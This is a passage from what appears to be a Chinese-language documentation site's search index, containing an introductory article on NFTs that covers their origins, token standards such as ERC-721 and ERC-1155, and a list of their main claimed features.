\u5c31\u50cf\u73b0\u5b9e\u4e16\u754c\u4e00\u6837\uff0c\u4e0d\u5b58\u5728\u8868\u73b0\u51fa\u76f8\u4f3c\u7279\u5f81\u6216\u4ef7\u503c\u7684\u4e24\u79cd\u8d44\u4ea7\uff0c\u540c\u6837\uff0c\u533a\u5757\u94fe\u4e0a\u7684\u6bcf\u4e00\u79cd\u4ee3\u5e01\u5316\u8d44\u4ea7\u90fd\u5177\u6709\u72ec\u4e00\u65e0\u4e8c\u7684\u7279\u5f81\u3002\u533a\u5757\u94fe\u6570\u5b57\u8d44\u4ea7\u4e4b\u95f4\u662f\u6709\u533a\u522b\u7684\uff0c\u4e0d\u80fd\u8fdb\u884c\u4e92\u6362\uff0c\u6240\u4ee5\u88ab\u79f0\u4e3a\u975e\u540c\u8d28\u5316\u4ee3\u5e01\uff08Non-Fungible Tokens\uff09\u3002\u73b0\u5b9e\u4e16\u754c\u4e2d\uff0c\u771f\u5b9e\u8d44\u4ea7\u62e5\u6709\u6240\u6709\u6743\u8bc1\u4e66\uff0c\u540c\u6837\uff0c\u5728\u533a\u5757\u94fe\u4e16\u754c\u4e2d\uff0cNFT \u4ee3\u5e01\u53ef\u4ee5\u4fdd\u6301\u6240\u6709\u6743\u8bb0\u5f55\u548c\u771f\u5b9e\u6027\u8bc1\u660e\u3002 \u975e\u540c\u8d28\u5316\u4ee3\u5e01\u662f\u6307\u5728\u67d0\u4e9b\u533a\u5757\u94fe\u4e0a\u6301\u6709\u7684\u6613\u4e8e\u4ea4\u6362\u4e14\u5177\u6709\u4e2a\u4f53\u552f\u4e00\u6027\u7684\u6570\u5b57\u8d44\u4ea7\uff0c\u4e3b\u8981\u4f4d\u4e8e\u4ee5\u592a\u574a\u4e0a\uff0c\u4f46\u4e5f\u5305\u62ec Conflux \u3001Flow\u3001Wax \u7b49\u5176\u4ed6\u533a\u5757\u94fe\u3002 NFT \u5e76\u975e\u521d\u6765\u4e4d\u5230\u30022012 \u5e74\u4fbf\u63a8\u51fa\u4e86\u7b2c\u4e00\u4e2a\u5c06\u5efa\u5728\u6bd4\u7279\u5e01\u7f51\u7edc\u4e0a\u7684\u7c7b\u4f3c NFT \u7684\u4ee3\u5e01\u2014\u2014Coloured Coins\uff0c\u53c8\u540d Bitcoin 2.x\u3002\u4f46\u6700\u5e38\u89c1\u7684 NFT \u8fd8\u662f\u4ee5\u592a\u574a\u7684 ERC 721\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u5176\u4ed6 NFT\uff0c\u5982 Enjin \u5f00\u53d1\u7684\u57fa\u4e8e\u4ee5\u592a\u574a\u5efa\u6784\u7684 ERC 1155\uff0cERC 1155 \u662f\u7535\u5b50\u6e38\u620f\u4ee3\u5e01\u65b0\u6807\u51c6\u3002NFT \u5927\u591a\u5b58\u50a8\u5728\u5408\u9002\u7684\u6570\u5b57\u94b1\u5305\u4e2d\uff0c\u5982 MyEtherWallet \u548c Ledger Hardware \u94b1\u5305\uff0c\u5728\u5e02\u573a\u4e0a\u5f88\u5bb9\u6613\u8fdb\u884c\u5b9a\u5236\u548c\u4ea4\u6613\u3002 NFT \u4e4b\u95f4\u65e0\u8bba\u662f\u4ef7\u503c\u8fd8\u662f\u5c5e\u6027\u90fd\u5404\u4e0d\u76f8\u540c\u3002\u6bcf\u4e2a\u4ee3\u5e01\u90fd\u6709\u533a\u522b\u4e8e\u5176\u4ed6\u4ee3\u5e01\u7684\u6570\u5b57\u54c8\u5e0c\u503c\u3002\u56e0\u6b64\uff0cNFT \u53ef\u4ee5\u4f5c\u4e3a\u51fa\u5904\u8bc1\u660e\u3002\u8d8a\u6765\u8d8a\u591a\u7684\u4eba\u8ba4\u8bc6\u5230 NFT \u6781\u5177\u4ef7\u503c\uff0c\u5b83\u4e0d\u4ec5\u80fd\u8bc1\u660e\u539f\u521b\u827a\u672f\u54c1\u548c\u6e38\u620f\u4ee3\u5e01\u7b49\u77e5\u8bc6\u4ea7\u6743\u7684\u6240\u6709\u6743\u548c\u771f\u5b9e\u6027\uff0c\u8fd8\u80fd\u4ee3\u8868\u80a1\u7968\u3001\u623f\u5730\u4ea7\u7b49\u5b9e\u9645\u8d44\u4ea7\u3002\u5728\u6e38\u620f\u548c\u85cf\u54c1\u9886\u57df\uff0cNFT \u4e5f\u88ab\u79f0\u4e3a\u6570\u5b57\u85cf\u54c1\u3002 NFT \u4e0d\u4ec5\u5b58\u5728\u4e8e\u6570\u5b57\u7a7a\u95f4\uff0c\u66f4\u91cd\u8981\u7684\u662f\uff0c\u5b83\u4eec\u4e5f\u53ef\u4ee5\u4ee3\u8868\u4efb\u4f55\u7c7b\u578b\u7684\u7269\u7406\u8d44\u4ea7\uff0c\u4f5c\u4e3a\u4e00\u79cd \"\u6570\u5b57\u5b6a\u751f\"\uff0c\u4e0e\u73b0\u5b9e\u4e16\u754c\u4e2d\u5b58\u5728\u7684\u4efb\u4f55\u4e1c\u897f\u76f8\u8fde\u63a5\uff0c\u5e76\u5728\u6570\u5b57\u5e02\u573a\u4e0a\u5b9e\u73b0\u5b9e\u7269\u8d44\u4ea7\u7684\u6240\u6709\u6743\u8f6c\u624b\u548c\u4ea4\u6613\u3002 NFT\u7684\u4e3b\u8981\u7279\u70b9 \u00b6 \u6839\u636e NFT \u7684\u7b80\u4ecb\u5185\u5bb9\uff0c\u6216\u8bb8\u60a8\u5df2\u7ecf\u5bf9 NFT \u7684\u72ec\u7279\u4e4b\u5904\u5df2\u7ecf\u7565\u77e5\u4e00\u4e8c\u3002\u4ee5\u4e0b\u5c06\u4e3a\u60a8\u8be6\u7ec6\u4ecb\u7ecd NFT \u7684\u4e3b\u8981\u5341\u5927\u7279\u70b9: \uff081\uff09\u72ec\u4e00\u65e0\u4e8c \uff1aNFT \u5728\u5176\u4ee3\u7801\u4e2d\u5305\u542b\u4e86\u6bcf\u4e2a\u4ee3\u5e01\u5c5e\u6027\u7684\u4fe1\u606f\uff0c\u4f7f\u5176\u4e0e\u5176\u4ed6\u4ee3\u5e01\u4e0d\u540c\u3002\u52a0\u5bc6\u6570\u5b57\u827a\u672f\u54c1\u53ef\u80fd\u6bcf\u4e2a\u50cf\u7d20\u90fd\u5185\u5d4c\u4e86\u7f16\u7801\u4fe1\u606f\uff0c\u52a0\u5bc6\u6e38\u620f\u7269\u54c1\u53ef\u80fd\u5e95\u5c42\u6709\u8bf8\u591a\u7ec6\u8282\uff0c\u8ba9\u6e38\u620f\u5ba2\u6237\u7aef\u4e86\u89e3\u73a9\u5bb6\u62e5\u6709\u7684\u7269\u54c1\u53ca\u5176\u5c5e\u6027\u3002\u52a0\u5bc6\u8d27\u5e01\u548c\u975e\u540c\u8d28\u5316\u4ee3\u5e01\u4e4b\u95f4\u7684\u5173\u952e\u533a\u522b\u4e4b\u4e00\u662f\uff0c\u6bcf\u4e00\u4e2a NFT\u90fd\u662f\u72ec\u4e00\u65e0\u4e8c\u4e14\u5b8c\u6574\u7684\uff0c\u4e0d\u80fd\u901a\u8fc7\u8eab\u4efd\u3001\u4ef7\u503c\u548c/\u6216\u6548\u7528\u4e0e\u4efb\u4f55\u5176\u4ed6\u8d44\u4ea7\u76f4\u63a5\u4e92\u6362\u3002 \uff082\uff09\u53ef\u8ffd\u6eaf \uff1a\u6bcf\u4e2a NFT \u5728\u94fe\u4e0a\u90fd\u6709\u4ea4\u6613\u8bb0\u5f55\uff0c\u4ece\u521b\u5efa\u5230\u8f6c\u624b\u3002\u6bcf\u4e2a\u4ee3\u5e01\u90fd\u53ef\u4ee5\u9a8c\u8bc1\uff0c\u8bc1\u660e\u771f\u4f2a\uff0c\u9632\u6b62\u6b3a\u8bc8\u2014\u2014\u8fd9\u5bf9\u4e8e\u62e5\u6709\u8005\u548c\u6f5c\u5728\u4e70\u5bb6\u6765\u8bf4\u81f3\u5173\u91cd\u8981\uff01 \uff083\uff09\u7a00\u7f3a\u6027 \uff1a\u4e3a\u4e86\u4f7f NFT \u5bf9\u4e70\u5bb6\u5177\u6709\u5438\u5f15\u529b\uff0cNFT \u5e94\u8be5\u5177\u6709\u7a00\u7f3a\u6027\u3002\u8fd9\u65e2\u80fd\u4fdd\u8bc1\u52a0\u5bc6\u8d44\u4ea7\u7684\u957f\u8fdc\u53d1\u5c55\uff0c\u4e5f\u4e0d\u4f1a\u6709\u4f9b\u4e0d\u5e94\u6c42\u7684\u9690\u60a3\u3002 \uff08 4\uff09\u4e0d\u53ef\u5206\u5272\u6027 \uff1aNFT \u4e0d\u80fd\u5207\u5272\u6210\u90e8\u5206\u7528\u4e8e\u4ea4\u6613\u3002\u5c31\u50cf\u534a\u5f20\u6f14\u5531\u4f1a\u95e8\u7968\u4e0d\u4f1a\u534a\u5f20\u51fa\u552e\u4e00\u6837\uff0cNFT \u4e5f\u4e0d\u80fd\u5206\u5272\u6210\u4e3a\u66f4\u5c0f\u9762\u989d\u3002 \uff085\uff09\u53ef\u7f16\u7a0b\u6027 \uff1a\u50cf\u6240\u6709\u4f20\u7edf\u7684\u6570\u5b57\u8d44\u4ea7\u548c\u5efa\u7acb\u5728\u667a\u80fd\u5408\u7ea6\u533a\u5757\u94fe\u4e0a\u7684\u4ee3\u5e01\u4e00\u6837\uff0cNFT \u5b8c\u5168\u53ef\u7f16\u7a0b\u3002CryptoKitties \u548c Axie Infinity \u9879\u76ee\u90fd\u5f15\u5165\u4e86\u7e41\u80b2\u673a\u5236\uff0c\u5c06\u4ee3\u5e01\u8fdb\u884c\u7f16\u7801\u3002\u6bcf\u4e00\u4e2a\u975e\u540c\u8d28\u5316\u4ee3\u5e01\u90fd\u662f\u7531\u5143\u6570\u636e\u7ec4\u6210\u7684\uff0c\u8fd9\u4e9b\u5143\u6570\u636e\u8d4b\u4e88\u4e86\u6bcf\u4e00\u4e2a\u4ee3\u5e01\u4e2a\u6027\uff0c\u5305\u62ec\u5927\u5c0f\u3001\u6240\u6709\u8005\u540d\u5b57\u3001\u7a00\u7f3a\u6027\u7b49\u3002NFT \u7684\u6f5c\u529b\u662f\u65e0\u9650\u7684\u3002 \uff086\uff09\u6240\u6709\u6743 \uff1aNFT \u7ed3\u5408\u4e86\u53bb\u4e2d\u5fc3\u5316\u533a\u5757\u94fe\u6280\u672f\u4e0e\u975e\u540c\u8d28\u5316\u8d44\u4ea7\u7684\u6700\u4f73\u7279\u6027\u3002\u4e0e\u7531\u4e2d\u5fc3\u5316\u5b9e\u4f53\u53d1\u884c\u548c\u76d1\u7ba1\u7684\u666e\u901a\u6570\u5b57\u8d44\u4ea7\u4e0d\u540c\uff0cNFT \u52a0\u5bc6\u8d44\u4ea7\u53ef\u4ee5\u968f\u7528\u968f\u53d6\uff0c\u4e5f\u80fd\u8d4b\u4e88\u6240\u6709\u8005\u771f\u6b63\u7684\u6240\u6709\u6743\u3002\u771f\u6b63\u7684\u6240\u6709\u6743\u662f\u4efb\u4f55 NFT \u7684\u5173\u952e\u7ec4\u6210\u90e8\u5206\u4e4b\u4e00\uff0c\u968f\u7740\u6570\u5b57\u7ecf\u6d4e\u7684\u4e0d\u65ad\u53d1\u5c55\uff0c\u6beb\u65e0\u7591\u95ee\uff0cNFT \u5c06\u53d1\u6325\u5173\u952e\u4f5c\u7528\uff0c\u4f7f\u6570\u5b57\u4e16\u754c\u548c\u7269\u7406\u4e16\u754c\u6bd4\u4ee5\u5f80\u4efb\u4f55\u65f6\u5019\u90fd\u66f4\u52a0\u7d27\u5bc6\u3002 \uff087\uff09\u53ef\u8f6c\u8ba9\u6027 \uff1a\u7531\u4e8e NFT \u662f\u53bb\u4e2d\u5fc3\u5316\u7684\uff0c\u6240\u4ee5\u4e0d\u9700\u8981\u4e2d\u592e\u53d1\u884c\u673a\u6784\uff0c\u6ca1\u6709\u7b2c\u4e09\u65b9\u7684\u5e72\u6d89\uff0c\u4f7f\u5f97\u5b83\u4eec\u7684\u8f6c\u8ba9\u4e5f\u5c06\u53d8\u5f97\u66f4\u5bb9\u6613\u3002\u6bd4\u5982\u5728\u6e38\u620f\u9886\u57df\uff0cNFT \u89e3\u51b3\u4e86\u4f20\u7edf\u6e38\u620f\u4e2d\u7684\u6392\u4ed6\u6027\u95ee\u9898\uff0c\u56e0\u4e3a\u8d44\u4ea7\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u5728\u4e0d\u540c\u7684\u533a\u5757\u94fe\u6e38\u620f\u4e4b\u95f4\u8f6c\u79fb\u4f7f\u7528\u3002\u7528\u6237\u5728NFT\u6e38\u620f\u4e2d\u5efa\u7acb\u6216\u8d2d\u4e70\u7684\u8d44\u4ea7\u662f\u7531\u7528\u6237\u4e2a\u4eba\u800c\u4e0d\u662f\u6e38\u620f\u516c\u53f8\u62e5\u6709\u7684\uff0c\u6240\u4ee5\u5b83\u4eec\u53ef\u4ee5\u5728\u4e0d\u540c\u7684\u4e16\u754c\u4e4b\u95f4\u8f6c\u79fb\uff0c\u5e76\u4e14\u53ef\u4ee5\u4ece\u4e00\u4e2a\u6e38\u620f\u5e26\u5230\u53e6\u4e00\u4e2a\u6e38\u620f\u3002 \uff088\uff09\u6807\u51c6\u5316 \uff1a\u4f20\u7edf\u7684\u6570\u5b57\u8d44\u4ea7\u5e76\u6ca1\u6709\u7edf\u4e00\u7684\u8868\u8fbe\u65b9\u5f0f\uff0c\u800c\u901a\u8fc7\u5728\u516c\u94fe\u4e0a\u663e\u793a\u975e\u540c\u8d28\u5316\u8d44\u4ea7\uff0c\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u6784\u5efa\u901a\u7528\u3001\u53ef\u91cd\u7528\u3001\u53ef\u7ee7\u627f\u7684\u6240\u6709\u975e\u540c\u8d28\u5316\u4ee3\u5e01\u6807\u51c6\u3002\u8fd9\u5305\u62ec\u57fa\u672c\u7684\u539f\u8bed\uff0c\u5982\u6240\u6709\u6743\u3001\u4f20\u8f93\u548c\u7b80\u5355\u7684\u8bbf\u95ee\u63a7\u5236\u3002 \uff089\uff09\u6d41\u52a8\u6027 \uff1a\u975e\u540c\u8d28\u5316\u8d44\u4ea7\u7684\u6781\u901f\u53ef\u4ea4\u6613\u6027\u4f1a\u5e26\u6765\u6d41\u52a8\u6027\u7684\u63d0\u5347\u3002NFT \u5e02\u573a\u53ef\u4ee5\u6ee1\u8db3\u5404\u79cd\u53d7\u4f17\u7684\u9700\u6c42\uff0c\u4ece\u4e25\u683c\u7684\u4ea4\u6613\u8005\u5230\u8f83\u4e0d\u6210\u719f\u7684\u4ea4\u6613\u8005\uff0c\u90fd\u53ef\u4ee5\u8ba9\u8d44\u4ea7\u66f4\u5e7f\u6cdb\u5730\u9762\u5411\u66f4\u591a\u7684\u8d2d\u4e70\u8005\u3002\u4e0e 2017 \u5e74\u7684 ICO \u70ed\u6f6e\u50ac\u751f\u51fa\u7531\u5373\u65f6\u6d41\u52a8\u8d27\u5e01\u9a71\u52a8\u7684\u65b0\u4e00\u7c7b\u8d44\u4ea7\u4e00\u6837\uff0c NFT \u62d3\u5c55\u4e86\u6570\u5b57\u8d44\u4ea7\u8fd9\u4e00\u72ec\u7279\u7684\u5e02\u573a\u3002 \uff0810\uff09\u4e92\u64cd\u4f5c\u6027 \uff1a\u975e\u540c\u8d28\u5316\u4ee3\u5e01\u6807\u51c6\u5141\u8bb8 NFT \u5728\u591a\u4e2a\u751f\u6001\u7cfb\u7edf\u4e4b\u95f4\u8f7b\u677e\u79fb\u52a8\u3002\u5f53\u5f00\u53d1\u4eba\u5458\u542f\u52a8\u65b0\u7684 NFT \u9879\u76ee\u65f6\uff0c\u8fd9\u4e9b NFT \u53ef\u4ee5\u7acb\u5373\u5728\u6570\u5341\u4e2a\u4e0d\u540c\u7684\u94b1\u5305\u63d0\u4f9b\u7a0b\u5e8f\u4e2d\u67e5\u770b\uff0c\u53ef\u4ee5\u5728\u5e02\u573a\u4e0a\u8fdb\u884c\u4ea4\u6613\uff0c\u5e76\u4e14\u53ef\u4ee5\u5728\u865a\u62df\u4e16\u754c\u4e2d\u663e\u793a\uff0c\u56e0\u4e3a\u5f00\u653e\u6807\u51c6\u4e3a\u8bfb\u53d6\u548c\u5199\u5165\u6570\u636e\u63d0\u4f9b\u4e86\u6e05\u6670\u3001\u4e00\u81f4\u3001\u53ef\u9760\u548c\u8bb8\u53ef\u7684 API\u3002 \u00b6","title":"\u521d\u8bc6NFT"},{"location":"nft/introduction/#nft","text":"","title":"\u521d\u8bc6NFT"},{"location":"nft/introduction/#nft_1","text":"\u5c31\u50cf\u73b0\u5b9e\u4e16\u754c\u4e00\u6837\uff0c\u4e0d\u5b58\u5728\u8868\u73b0\u51fa\u76f8\u4f3c\u7279\u5f81\u6216\u4ef7\u503c\u7684\u4e24\u79cd\u8d44\u4ea7\uff0c\u540c\u6837\uff0c\u533a\u5757\u94fe\u4e0a\u7684\u6bcf\u4e00\u79cd\u4ee3\u5e01\u5316\u8d44\u4ea7\u90fd\u5177\u6709\u72ec\u4e00\u65e0\u4e8c\u7684\u7279\u5f81\u3002\u533a\u5757\u94fe\u6570\u5b57\u8d44\u4ea7\u4e4b\u95f4\u662f\u6709\u533a\u522b\u7684\uff0c\u4e0d\u80fd\u8fdb\u884c\u4e92\u6362\uff0c\u6240\u4ee5\u88ab\u79f0\u4e3a\u975e\u540c\u8d28\u5316\u4ee3\u5e01\uff08Non-Fungible Tokens\uff09\u3002\u73b0\u5b9e\u4e16\u754c\u4e2d\uff0c\u771f\u5b9e\u8d44\u4ea7\u62e5\u6709\u6240\u6709\u6743\u8bc1\u4e66\uff0c\u540c\u6837\uff0c\u5728\u533a\u5757\u94fe\u4e16\u754c\u4e2d\uff0cNFT \u4ee3\u5e01\u53ef\u4ee5\u4fdd\u6301\u6240\u6709\u6743\u8bb0\u5f55\u548c\u771f\u5b9e\u6027\u8bc1\u660e\u3002 \u975e\u540c\u8d28\u5316\u4ee3\u5e01\u662f\u6307\u5728\u67d0\u4e9b\u533a\u5757\u94fe\u4e0a\u6301\u6709\u7684\u6613\u4e8e\u4ea4\u6362\u4e14\u5177\u6709\u4e2a\u4f53\u552f\u4e00\u6027\u7684\u6570\u5b57\u8d44\u4ea7\uff0c\u4e3b\u8981\u4f4d\u4e8e\u4ee5\u592a\u574a\u4e0a\uff0c\u4f46\u4e5f\u5305\u62ec Conflux \u3001Flow\u3001Wax \u7b49\u5176\u4ed6\u533a\u5757\u94fe\u3002 NFT \u5e76\u975e\u521d\u6765\u4e4d\u5230\u30022012 \u5e74\u4fbf\u63a8\u51fa\u4e86\u7b2c\u4e00\u4e2a\u5c06\u5efa\u5728\u6bd4\u7279\u5e01\u7f51\u7edc\u4e0a\u7684\u7c7b\u4f3c NFT \u7684\u4ee3\u5e01\u2014\u2014Coloured Coins\uff0c\u53c8\u540d Bitcoin 2.x\u3002\u4f46\u6700\u5e38\u89c1\u7684 NFT \u8fd8\u662f\u4ee5\u592a\u574a\u7684 ERC 721\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u5176\u4ed6 NFT\uff0c\u5982 Enjin \u5f00\u53d1\u7684\u57fa\u4e8e\u4ee5\u592a\u574a\u5efa\u6784\u7684 ERC 1155\uff0cERC 1155 \u662f\u7535\u5b50\u6e38\u620f\u4ee3\u5e01\u65b0\u6807\u51c6\u3002NFT \u5927\u591a\u5b58\u50a8\u5728\u5408\u9002\u7684\u6570\u5b57\u94b1\u5305\u4e2d\uff0c\u5982 MyEtherWallet \u548c Ledger Hardware \u94b1\u5305\uff0c\u5728\u5e02\u573a\u4e0a\u5f88\u5bb9\u6613\u8fdb\u884c\u5b9a\u5236\u548c\u4ea4\u6613\u3002 NFT \u4e4b\u95f4\u65e0\u8bba\u662f\u4ef7\u503c\u8fd8\u662f\u5c5e\u6027\u90fd\u5404\u4e0d\u76f8\u540c\u3002\u6bcf\u4e2a\u4ee3\u5e01\u90fd\u6709\u533a\u522b\u4e8e\u5176\u4ed6\u4ee3\u5e01\u7684\u6570\u5b57\u54c8\u5e0c\u503c\u3002\u56e0\u6b64\uff0cNFT \u53ef\u4ee5\u4f5c\u4e3a\u51fa\u5904\u8bc1\u660e\u3002\u8d8a\u6765\u8d8a\u591a\u7684\u4eba\u8ba4\u8bc6\u5230 NFT \u6781\u5177\u4ef7\u503c\uff0c\u5b83\u4e0d\u4ec5\u80fd\u8bc1\u660e\u539f\u521b\u827a\u672f\u54c1\u548c\u6e38\u620f\u4ee3\u5e01\u7b49\u77e5\u8bc6\u4ea7\u6743\u7684\u6240\u6709\u6743\u548c\u771f\u5b9e\u6027\uff0c\u8fd8\u80fd\u4ee3\u8868\u80a1\u7968\u3001\u623f\u5730\u4ea7\u7b49\u5b9e\u9645\u8d44\u4ea7\u3002\u5728\u6e38\u620f\u548c\u85cf\u54c1\u9886\u57df\uff0cNFT \u4e5f\u88ab\u79f0\u4e3a\u6570\u5b57\u85cf\u54c1\u3002 NFT \u4e0d\u4ec5\u5b58\u5728\u4e8e\u6570\u5b57\u7a7a\u95f4\uff0c\u66f4\u91cd\u8981\u7684\u662f\uff0c\u5b83\u4eec\u4e5f\u53ef\u4ee5\u4ee3\u8868\u4efb\u4f55\u7c7b\u578b\u7684\u7269\u7406\u8d44\u4ea7\uff0c\u4f5c\u4e3a\u4e00\u79cd \"\u6570\u5b57\u5b6a\u751f\"\uff0c\u4e0e\u73b0\u5b9e\u4e16\u754c\u4e2d\u5b58\u5728\u7684\u4efb\u4f55\u4e1c\u897f\u76f8\u8fde\u63a5\uff0c\u5e76\u5728\u6570\u5b57\u5e02\u573a\u4e0a\u5b9e\u73b0\u5b9e\u7269\u8d44\u4ea7\u7684\u6240\u6709\u6743\u8f6c\u624b\u548c\u4ea4\u6613\u3002","title":"\u4f55\u4e3aNFT"},{"location":"nft/introduction/#nft_2","text":"\u6839\u636e NFT \u7684\u7b80\u4ecb\u5185\u5bb9\uff0c\u6216\u8bb8\u60a8\u5df2\u7ecf\u5bf9 NFT \u7684\u72ec\u7279\u4e4b\u5904\u5df2\u7ecf\u7565\u77e5\u4e00\u4e8c\u3002\u4ee5\u4e0b\u5c06\u4e3a\u60a8\u8be6\u7ec6\u4ecb\u7ecd NFT \u7684\u4e3b\u8981\u5341\u5927\u7279\u70b9: \uff081\uff09\u72ec\u4e00\u65e0\u4e8c \uff1aNFT \u5728\u5176\u4ee3\u7801\u4e2d\u5305\u542b\u4e86\u6bcf\u4e2a\u4ee3\u5e01\u5c5e\u6027\u7684\u4fe1\u606f\uff0c\u4f7f\u5176\u4e0e\u5176\u4ed6\u4ee3\u5e01\u4e0d\u540c\u3002\u52a0\u5bc6\u6570\u5b57\u827a\u672f\u54c1\u53ef\u80fd\u6bcf\u4e2a\u50cf\u7d20\u90fd\u5185\u5d4c\u4e86\u7f16\u7801\u4fe1\u606f\uff0c\u52a0\u5bc6\u6e38\u620f\u7269\u54c1\u53ef\u80fd\u5e95\u5c42\u6709\u8bf8\u591a\u7ec6\u8282\uff0c\u8ba9\u6e38\u620f\u5ba2\u6237\u7aef\u4e86\u89e3\u73a9\u5bb6\u62e5\u6709\u7684\u7269\u54c1\u53ca\u5176\u5c5e\u6027\u3002\u52a0\u5bc6\u8d27\u5e01\u548c\u975e\u540c\u8d28\u5316\u4ee3\u5e01\u4e4b\u95f4\u7684\u5173\u952e\u533a\u522b\u4e4b\u4e00\u662f\uff0c\u6bcf\u4e00\u4e2a NFT\u90fd\u662f\u72ec\u4e00\u65e0\u4e8c\u4e14\u5b8c\u6574\u7684\uff0c\u4e0d\u80fd\u901a\u8fc7\u8eab\u4efd\u3001\u4ef7\u503c\u548c/\u6216\u6548\u7528\u4e0e\u4efb\u4f55\u5176\u4ed6\u8d44\u4ea7\u76f4\u63a5\u4e92\u6362\u3002 \uff082\uff09\u53ef\u8ffd\u6eaf \uff1a\u6bcf\u4e2a NFT \u5728\u94fe\u4e0a\u90fd\u6709\u4ea4\u6613\u8bb0\u5f55\uff0c\u4ece\u521b\u5efa\u5230\u8f6c\u624b\u3002\u6bcf\u4e2a\u4ee3\u5e01\u90fd\u53ef\u4ee5\u9a8c\u8bc1\uff0c\u8bc1\u660e\u771f\u4f2a\uff0c\u9632\u6b62\u6b3a\u8bc8\u2014\u2014\u8fd9\u5bf9\u4e8e\u62e5\u6709\u8005\u548c\u6f5c\u5728\u4e70\u5bb6\u6765\u8bf4\u81f3\u5173\u91cd\u8981\uff01 \uff083\uff09\u7a00\u7f3a\u6027 \uff1a\u4e3a\u4e86\u4f7f NFT \u5bf9\u4e70\u5bb6\u5177\u6709\u5438\u5f15\u529b\uff0cNFT \u5e94\u8be5\u5177\u6709\u7a00\u7f3a\u6027\u3002\u8fd9\u65e2\u80fd\u4fdd\u8bc1\u52a0\u5bc6\u8d44\u4ea7\u7684\u957f\u8fdc\u53d1\u5c55\uff0c\u4e5f\u4e0d\u4f1a\u6709\u4f9b\u4e0d\u5e94\u6c42\u7684\u9690\u60a3\u3002 \uff08 4\uff09\u4e0d\u53ef\u5206\u5272\u6027 \uff1aNFT \u4e0d\u80fd\u5207\u5272\u6210\u90e8\u5206\u7528\u4e8e\u4ea4\u6613\u3002\u5c31\u50cf\u534a\u5f20\u6f14\u5531\u4f1a\u95e8\u7968\u4e0d\u4f1a\u534a\u5f20\u51fa\u552e\u4e00\u6837\uff0cNFT \u4e5f\u4e0d\u80fd\u5206\u5272\u6210\u4e3a\u66f4\u5c0f\u9762\u989d\u3002 \uff085\uff09\u53ef\u7f16\u7a0b\u6027 \uff1a\u50cf\u6240\u6709\u4f20\u7edf\u7684\u6570\u5b57\u8d44\u4ea7\u548c\u5efa\u7acb\u5728\u667a\u80fd\u5408\u7ea6\u533a\u5757\u94fe\u4e0a\u7684\u4ee3\u5e01\u4e00\u6837\uff0cNFT \u5b8c\u5168\u53ef\u7f16\u7a0b\u3002CryptoKitties \u548c Axie Infinity \u9879\u76ee\u90fd\u5f15\u5165\u4e86\u7e41\u80b2\u673a\u5236\uff0c\u5c06\u4ee3\u5e01\u8fdb\u884c\u7f16\u7801\u3002\u6bcf\u4e00\u4e2a\u975e\u540c\u8d28\u5316\u4ee3\u5e01\u90fd\u662f\u7531\u5143\u6570\u636e\u7ec4\u6210\u7684\uff0c\u8fd9\u4e9b\u5143\u6570\u636e\u8d4b\u4e88\u4e86\u6bcf\u4e00\u4e2a\u4ee3\u5e01\u4e2a\u6027\uff0c\u5305\u62ec\u5927\u5c0f\u3001\u6240\u6709\u8005\u540d\u5b57\u3001\u7a00\u7f3a\u6027\u7b49\u3002NFT \u7684\u6f5c\u529b\u662f\u65e0\u9650\u7684\u3002 \uff086\uff09\u6240\u6709\u6743 \uff1aNFT \u7ed3\u5408\u4e86\u53bb\u4e2d\u5fc3\u5316\u533a\u5757\u94fe\u6280\u672f\u4e0e\u975e\u540c\u8d28\u5316\u8d44\u4ea7\u7684\u6700\u4f73\u7279\u6027\u3002\u4e0e\u7531\u4e2d\u5fc3\u5316\u5b9e\u4f53\u53d1\u884c\u548c\u76d1\u7ba1\u7684\u666e\u901a\u6570\u5b57\u8d44\u4ea7\u4e0d\u540c\uff0cNFT \u52a0\u5bc6\u8d44\u4ea7\u53ef\u4ee5\u968f\u7528\u968f\u53d6\uff0c\u4e5f\u80fd\u8d4b\u4e88\u6240\u6709\u8005\u771f\u6b63\u7684\u6240\u6709\u6743\u3002\u771f\u6b63\u7684\u6240\u6709\u6743\u662f\u4efb\u4f55 NFT \u7684\u5173\u952e\u7ec4\u6210\u90e8\u5206\u4e4b\u4e00\uff0c\u968f\u7740\u6570\u5b57\u7ecf\u6d4e\u7684\u4e0d\u65ad\u53d1\u5c55\uff0c\u6beb\u65e0\u7591\u95ee\uff0cNFT \u5c06\u53d1\u6325\u5173\u952e\u4f5c\u7528\uff0c\u4f7f\u6570\u5b57\u4e16\u754c\u548c\u7269\u7406\u4e16\u754c\u6bd4\u4ee5\u5f80\u4efb\u4f55\u65f6\u5019\u90fd\u66f4\u52a0\u7d27\u5bc6\u3002 \uff087\uff09\u53ef\u8f6c\u8ba9\u6027 \uff1a\u7531\u4e8e NFT \u662f\u53bb\u4e2d\u5fc3\u5316\u7684\uff0c\u6240\u4ee5\u4e0d\u9700\u8981\u4e2d\u592e\u53d1\u884c\u673a\u6784\uff0c\u6ca1\u6709\u7b2c\u4e09\u65b9\u7684\u5e72\u6d89\uff0c\u4f7f\u5f97\u5b83\u4eec\u7684\u8f6c\u8ba9\u4e5f\u5c06\u53d8\u5f97\u66f4\u5bb9\u6613\u3002\u6bd4\u5982\u5728\u6e38\u620f\u9886\u57df\uff0cNFT \u89e3\u51b3\u4e86\u4f20\u7edf\u6e38\u620f\u4e2d\u7684\u6392\u4ed6\u6027\u95ee\u9898\uff0c\u56e0\u4e3a\u8d44\u4ea7\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u5728\u4e0d\u540c\u7684\u533a\u5757\u94fe\u6e38\u620f\u4e4b\u95f4\u8f6c\u79fb\u4f7f\u7528\u3002\u7528\u6237\u5728NFT\u6e38\u620f\u4e2d\u5efa\u7acb\u6216\u8d2d\u4e70\u7684\u8d44\u4ea7\u662f\u7531\u7528\u6237\u4e2a\u4eba\u800c\u4e0d\u662f\u6e38\u620f\u516c\u53f8\u62e5\u6709\u7684\uff0c\u6240\u4ee5\u5b83\u4eec\u53ef\u4ee5\u5728\u4e0d\u540c\u7684\u4e16\u754c\u4e4b\u95f4\u8f6c\u79fb\uff0c\u5e76\u4e14\u53ef\u4ee5\u4ece\u4e00\u4e2a\u6e38\u620f\u5e26\u5230\u53e6\u4e00\u4e2a\u6e38\u620f\u3002 \uff088\uff09\u6807\u51c6\u5316 